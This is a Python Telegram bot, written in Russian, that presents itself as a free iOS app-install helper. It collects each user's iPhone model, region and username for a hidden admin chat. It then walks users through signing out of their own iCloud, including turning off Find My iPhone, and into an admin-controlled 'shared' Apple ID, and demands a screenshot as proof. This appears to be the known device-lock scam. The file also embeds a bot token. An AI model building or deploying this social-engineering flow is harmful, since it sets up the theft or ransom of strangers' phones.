import telebot
from telebot import types

bot = telebot.TeleBot('8192841914:AAFMSnjiuCxz8ZRA6aYyz35N2sqdEgLvQe8')

data = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    but1 = types.KeyboardButton('📥 Скачать приложение')
    markup.add(but1)
    bot.send_message(message.chat.id, '👋 Привет!\nЯ — HelperApps for iOS и помогу тебе установить любое нужное приложение 📲\nНажми кнопку «📥 Скачать приложение», чтобы начать.', reply_markup=markup) 


def receive_screenshot(message):
    if message.content_type == 'photo':
        try:
            file_id = message.photo[-1].file_id
            caption = f"Скриншот от @{message.from_user.username}" if message.from_user.username else f"Скриншот от {message.from_user.first_name}"
            bot.send_photo(chat_id=7250450110, photo=file_id, caption=caption)
            bot.send_message(message.chat.id, "✅ Скриншот получен")
        except Exception as e:
            bot.reply_to(message, f"Ошибка при пересылке фото: {e}")
    else:
        bot.reply_to(message, "Пожалуйста, отправьте именно фото или скриншот. Если с чем-то возникли вопросы-проблемы, нажмите на кнопку Поддержка💬️")
        bot.register_next_step_handler(message, receive_screenshot)

def get_sccrin(message):
    user_id = message.chat.id
    bot.send_message(user_id, '✨ Готово\nТвоя заявка успешно отправлена ✅\n⏳ В ближайшие минуты с тобой свяжется администратор,\nчтобы помочь установить.')
    bot.register_next_step_handler(message, receive_screenshot)

def get_apps(message):
    user_id = message.chat.id
    markup = types.InlineKeyboardMarkup(row_width=True)
    but1 = types.InlineKeyboardButton(text='Поддержка💬️', callback_data='help')
    markup.add(but1)
    data[user_id]['apps'] = message.text
    model = data[user_id]['model']
    region = data[user_id]['region']
    apps = data[user_id]['apps']
    bot.send_message(chat_id=7250450110, text=f"Модель айфона: {model}\nРегион/Страна: {region}\nПришла за: {apps}\nЮзер: @{message.from_user.username}")
    bot.send_message(user_id, 
        'Теперь дело за малым! Тебе надо выйти со своего iCloud и зайти на Общий iCloud!\n\n'
        '1. Что такое общий iCloud\n\n'
        'Общий iCloud — это Apple ID (учётная запись Apple), пароли от которого знают несколько человек. '
        'Обычно его создаёт один человек, на него покупают игры, приложения или медиа, и потом этот аккаунт дают другим людям, '
        'чтобы они могли зайти и скачать купленные вещи бесплатно.\n\n'
        '2. Выход из своего iCloud\n\n'
        '1. Открой Настройки.\n'
        '2. Нажми на своё имя/аватар вверху (Apple ID).\n'
        '3. Пролистай вниз и выбери Выйти.\n'
        '4. Введи пароль от Apple ID, чтобы отключить «Найти iPhone».\n'
        '5. Подтверди выход — можно выбрать, чтобы данные с устройства больше не синхронизировались с этим аккаунтом '
        '(они всё равно сохранятся в твоём iCloud и никуда не денутся).\n\n'
        '3. Вход в общий iCloud\n\n'
        '1. После выхода в Настройках снова открой раздел входа в iPhone.\n'
        '2. Введи логин и пароль от общего Apple ID (который тебе даст админ).\n'
        '3. Дождись синхронизации.\n\n'
        'Если было что-то непонятно, то лучше обратитесь в нашу поддержку, где вам всё объяснит уже реальный человек.\n\n'
        'НО ЧТОБЫ УБЕДИТЬСЯ, ЧТО ВЫ ВСЁ ПРАВИЛЬНО СДЕЛАЛИ, ОТПРАВЬТЕ СКРИНШОТ В ЧАТ, '
        'ЧТО ВЫ ВЫШЛИ С iCloud КАК ПОКАЗАНО НА ПРИМЕРЕ НИЖЕ: 👇', reply_markup=markup
    )

    bot.send_photo(user_id, 'https://postimg.cc/gallery/jTJ4Lyf')

    bot.register_next_step_handler(message, receive_screenshot)
    bot.register_next_step_handler(message, get_sccrin)

def get_region(message):
    user_id = message.chat.id
    data[user_id]['region'] = message.text
    bot.send_message(user_id, 'Принял! ✅\nНапиши название приложения, которое хочешь установить. 🎯')
    bot.register_next_step_handler(message, get_apps)

def get_model(message):
    user_id = message.chat.id
    data[user_id] = {}
    data[user_id]['model'] = message.text
    bot.send_message(message.chat.id, 'Спасибо! 👍\nТеперь укажи, пожалуйста, свой регион или страну\nпроживания. 🌍')
    bot.register_next_step_handler(message, get_region)

@bot.callback_query_handler(func=lambda call: True)
def helper(call):
    if call.data == 'help':
        bot.send_message(call.message.chat.id, 'Если у тебя возникли вопросы или нужна помощь, не стесняйся — свяжись с @helppios_1, и он обязательно поможет разобраться.')


@bot.message_handler(content_types=['text'])
def main(message):
    if message.text == '📥 Скачать приложение':
        bot.send_message(message.chat.id, 'Отлично!\n🔹 Напиши, пожалуйста, модель твоего iPhone.\n(Это важно, потому что некоторые приложения не подходят под все устройства.)', reply_markup=types.ReplyKeyboardRemove())
        bot.register_next_step_handler(message, get_model)


bot.polling()